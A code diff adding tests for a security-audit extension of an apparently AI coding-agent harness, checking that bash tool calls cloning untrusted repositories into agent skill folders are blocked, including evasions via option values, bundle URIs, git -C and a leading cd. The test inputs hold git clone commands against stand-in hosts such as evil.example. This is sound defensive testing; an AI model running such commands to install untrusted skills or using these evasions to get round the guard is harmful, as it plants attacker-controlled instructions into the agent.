@@ -1,6 +1,6 @@
 import assert from "node:assert/strict";
 import { existsSync, readFileSync, rmSync, mkdtempSync } from "node:fs";
-import { tmpdir } from "node:os";
+import { homedir, tmpdir } from "node:os";
 import { join } from "node:path";
 import test, { after } from "node:test";
 import type { ExtensionAPI, ExtensionContext, ToolCallEvent, ToolCallEventResult } from "../core/extensions-host/types.js";
@@ -15,7 +15,7 @@ after(() => {
 	rmSync(tempAgentDir, { recursive: true, force: true });
 });
 
-function createHarness() {
+function createHarness(cwd = tempAgentDir) {
 	const handlers = new Map<string, Array<(event: unknown) => unknown>>();
 	const messages: string[] = [];
 
@@ -34,7 +34,7 @@ function createHarness() {
 	const ctx = {
 		sessionManager: {},
 		agentDir: tempAgentDir,
-		cwd: tempAgentDir,
+		cwd,
 	} as unknown as ExtensionContext;
 
 	const emitToolCall = async (event: ToolCallEvent): Promise<ToolCallEventResult | undefined> => {
@@ -135,6 +135,141 @@ test("security-audit blocks external git clone into trusted skill directories", 
 	assert.equal(result?.block, true);
 	assert.match(result?.reason ?? "", /untrusted skill/i);
 	assert.match(harness.messages[0], /untrusted skill/i);
+});
+
+test("security-audit blocks skill clones after value-taking long options", async () => {
+	const harness = createHarness();
+	await securityAuditExtension(harness.api);
+
+	const result = await harness.emitToolCall({
+		type: "tool_call",
+		toolCallId: "call-skill-clone-depth",
+		toolName: "bash",
+		input: { command: "git clone --depth 1 https://example.com/untrusted/skill.git ~/skills/evil" },
+	});
+
+	assert.equal(result?.block, true);
+	assert.match(result?.reason ?? "", /untrusted skill/i);
+});
+
+test("security-audit blocks skill clones with inline option values", async () => {
+	const harness = createHarness();
+	await securityAuditExtension(harness.api);
+
+	const result = await harness.emitToolCall({
+		type: "tool_call",
+		toolCallId: "call-skill-clone-inline-depth",
+		toolName: "bash",
+		input: { command: "git clone --depth=1 https://example.com/untrusted/skill.git ~/.codex/skills/evil" },
+	});
+
+	assert.equal(result?.block, true);
+	assert.match(result?.reason ?? "", /untrusted skill/i);
+});
+
+test("security-audit blocks skill clones after value-taking short options", async () => {
+	const harness = createHarness();
+	await securityAuditExtension(harness.api);
+
+	const result = await harness.emitToolCall({
+		type: "tool_call",
+		toolCallId: "call-skill-clone-branch",
+		toolName: "bash",
+		input: { command: "git clone -b main https://example.com/untrusted/skill.git ~/.claude/skills/evil" },
+	});
+
+	assert.equal(result?.block, true);
+	assert.match(result?.reason ?? "", /untrusted skill/i);
+});
+
+test("security-audit blocks skill clones with a bundle URI", async () => {
+	const harness = createHarness();
+	await securityAuditExtension(harness.api);
+
+	const result = await harness.emitToolCall({
+		type: "tool_call",
+		toolCallId: "call-skill-clone-bundle-uri",
+		toolName: "bash",
+		input: {
+			command: "git clone --bundle-uri https://evil.example/bundle https://evil.example/repo.git ~/.agents/skills/evil",
+		},
+	});
+
+	assert.equal(result?.block, true);
+	assert.match(result?.reason ?? "", /untrusted skill/i);
+});
+
+test("security-audit applies git -C before resolving an inferred clone target", async () => {
+	const harness = createHarness();
+	await securityAuditExtension(harness.api);
+
+	const result = await harness.emitToolCall({
+		type: "tool_call",
+		toolCallId: "call-skill-clone-git-c",
+		toolName: "bash",
+		input: { command: "git -C ~/.agents/skills clone https://evil.example/repo.git" },
+	});
+
+	assert.equal(result?.block, true);
+	assert.match(result?.reason ?? "", /untrusted skill/i);
+});
+
+test("security-audit applies a leading cd before resolving an inferred clone target", async () => {
+	const harness = createHarness();
+	await securityAuditExtension(harness.api);
+
+	const result = await harness.emitToolCall({
+		type: "tool_call",
+		toolCallId: "call-skill-clone-leading-cd",
+		toolName: "bash",
+		input: { command: "cd ~/.agents/skills && git clone https://evil.example/repo.git" },
+	});
+
+	assert.equal(result?.block, true);
+	assert.match(result?.reason ?? "", /untrusted skill/i);
+});
+
+test("security-audit infers an omitted clone target under a trusted skill cwd", async () => {
+	const harness = createHarness(join(homedir(), ".agents", "skills"));
+	await securityAuditExtension(harness.api);
+
+	const result = await harness.emitToolCall({
+		type: "tool_call",
+		toolCallId: "call-skill-clone-inferred",
+		toolName: "bash",
+		input: { command: "git clone https://example.com/untrusted/skill.git" },
+	});
+
+	assert.equal(result?.block, true);
+	assert.match(result?.reason ?? "", /untrusted skill/i);
+});
+
+test("security-audit allows external clones into ordinary project directories", async () => {
+	const harness = createHarness();
+	await securityAuditExtension(harness.api);
+
+	const result = await harness.emitToolCall({
+		type: "tool_call",
+		toolCallId: "call-project-clone",
+		toolName: "bash",
+		input: { command: "git clone --depth 1 https://example.com/team/project.git ./vendor/project" },
+	});
+
+	assert.equal(result, undefined);
+});
+
+test("security-audit does not classify local relative repositories as external installs", async () => {
+	const harness = createHarness(join(homedir(), ".agents", "skills"));
+	await securityAuditExtension(harness.api);
+
+	const result = await harness.emitToolCall({
+		type: "tool_call",
+		toolCallId: "call-local-skill-copy",
+		toolName: "bash",
+		input: { command: "git clone ../reviewed-skill ./reviewed-skill" },
+	});
+
+	assert.equal(result, undefined);
 });
 
 test("security-audit blocks prompt injection hidden in HTML comments before persistence", async () => {
